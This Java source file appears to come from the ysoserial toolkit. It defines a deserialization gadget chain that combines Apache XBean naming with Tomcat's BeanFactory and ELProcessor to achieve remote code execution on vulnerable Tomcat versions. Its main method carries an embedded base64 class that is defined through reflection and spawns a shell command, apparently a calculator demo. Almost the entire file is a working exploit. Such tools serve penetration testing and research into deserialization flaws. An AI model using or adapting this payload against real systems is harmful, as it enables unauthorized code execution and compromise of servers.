package ysoserial.payloads;

import org.apache.naming.ResourceRef;
import org.apache.xbean.naming.context.ContextUtil;
import org.apache.xbean.naming.context.WritableContext;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import javax.naming.Context;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.util.HashMap;

@PayloadTest(harness = "ysoserial.test.payloads.FileUploadTest", flaky = "possible race condition")
@Dependencies({"org.apache.xbean-naming", "BeanFactory（Tomcat<10.1.0-M14、10.0.21、9.0.63、8.5.79"})
@Authors({Authors.Unam4})
public class XbeanWithBeanFactory implements ObjectPayload<Object> {

    public Object getObject(final String command) throws Exception {
        Boolean xs = Boolean.parseBoolean(System.getProperty("xs", "false"));
        Reference ref = new ResourceRef(
            "javax.el.ELProcessor",
            null, "", "",
            true, "org.apache.naming.factory.BeanFactory",
            null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", command));

        Context ctx = Reflections.createWithoutConstructor(WritableContext.class);
        ContextUtil.ReadOnlyBinding binding = new ContextUtil.ReadOnlyBinding("foo", ref, ctx);

        if (xs) {
            Class<?> aClass1 = Class.forName("com.sun.org.apache.xpath.internal.objects.XStringForChars");
            Object xString = Reflections.createWithoutConstructor(aClass1);
            Reflections.setFieldValue(xString, "m_obj", new char[]{});
            HashMap hashMap1 = new HashMap();
            HashMap hashMap2 = new HashMap();
            hashMap1.put("zZ", xString);
            hashMap1.put("yy", binding);
            hashMap2.put("yy", xString);
            hashMap2.put("zZ", binding);
            HashMap map = Gadgets.makeMap(hashMap1, hashMap2);
            return map;
        }else {
            BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
            Reflections.setFieldValue(badAttributeValueExpException, "val", binding);

            return badAttributeValueExpException;
        }
    }

    public static void main(String[] args) throws Exception{
        //open -a calculator
        PayloadRunner.run(XbeanWithBeanFactory.class, new String[]{"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"try{var b = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('yv66vgAAADIAQAEAcW9yZy9hcGFjaGUvY29tbW9tcy9iZWFudXRpbHMvY295b3RlL2Rlc2VyaWFsaXphdGlvbi9zdGQvVW50eXBlZE9iamVjdERlc2VyaWFsaXplcmI2MmZjMzBiMGI3NjQ1Mzc5ZGY4MDViZjllZDA3ZGU1BwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEABGJhc2UBABJMamF2YS9sYW5nL1N0cmluZzsBAANzZXABAANjbWQBAAY8aW5pdD4BAAMoKVYBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwALDAAJAAoKAAQADQEAB29zLm5hbWUIAA8BABBqYXZhL2xhbmcvU3lzdGVtBwARAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwwAEwAUCgASABUBABBqYXZhL2xhbmcvU3RyaW5nBwAXAQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwwAGQAaCgAYABsBAAN3aW4IAB0BAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwAHwAgCgAYACEBAAdjbWQuZXhlCAAjDAAFAAYJAAIAJQEAAi9jCAAnDAAHAAYJAAIAKQEABy9iaW4vc2gIACsBAAItYwgALQwACAAGCQACAC8BABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIHADEBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWDAAJADMKADIANAEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7DAA2ADcKADIAOAEACDxjbGluaXQ+AQASb3BlbiAtYSBjYWxjdWxhdG9yCAA7CgACAA0BAARDb2RlAQANU3RhY2tNYXBUYWJsZQAhAAIABAAAAAMACQAFAAYAAAAJAAcABgAAAAkACAAGAAAAAgABAAkACgABAD4AAACEAAQAAgAAAFMqtwAOEhC4ABa2ABwSHrYAIpkAEBIkswAmEiizACqnAA0SLLMAJhIuswAqBr0AGFkDsgAmU1kEsgAqU1kFsgAwU0y7ADJZK7cANbYAOVenAARMsQABAAQATgBRAAwAAQA/AAAAFwAE/wAhAAEHAAIAAAllBwAM/AAABwAEAAgAOgAKAAEAPgAAABoAAgAAAAAADhI8swAwuwACWbcAPVexAAAAAAAA');var a=Java.type('int').class;var m=java.lang.ClassLoader.class.getDeclaredMethod('defineClass',Java.type('byte[]').class,a,a);m.setAccessible(true);m.invoke(java.lang.Thread.currentThread().getContextClassLoader(),b,0,b.length).newInstance();}catch (e){}\")}"});
    }
}

